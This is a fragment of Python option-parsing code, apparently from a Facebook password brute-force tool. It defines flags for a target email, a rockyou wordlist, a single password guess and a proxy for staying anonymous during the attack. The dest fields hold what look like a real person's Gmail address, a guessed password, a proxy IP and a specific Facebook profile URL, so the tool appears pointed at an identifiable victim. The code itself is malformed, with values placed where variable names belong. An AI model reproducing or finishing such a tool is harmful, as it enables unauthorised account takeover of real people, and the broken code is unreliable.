...
""")
def Main():
   parse.add_option("-t","--target",'-T','--TARGET',dest="daudraut@gmail.com",type="string",
      help="Specify Target Email ")
   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="C:\\Facebom-master\\rockyou.txt",type="string",
      help="Specify Wordlist File ")
   parse.add_option("-s","--singe","--S","--SINGLE",dest="wardha",type="string",
      help="Specify Single Password To Check it")
   parse.add_option("-p","-P","--proxy","--PROXY",dest="35.236.37.121 default(port=8080,80)",type="string",
                        help="Specify HTTP/S Proxy To Be Anonymous When Attack Enable")
   parse.add_option("-g","-G","--getid","--GETID",dest="https://www.facebook.com/pranay.raut.779642",type="string",
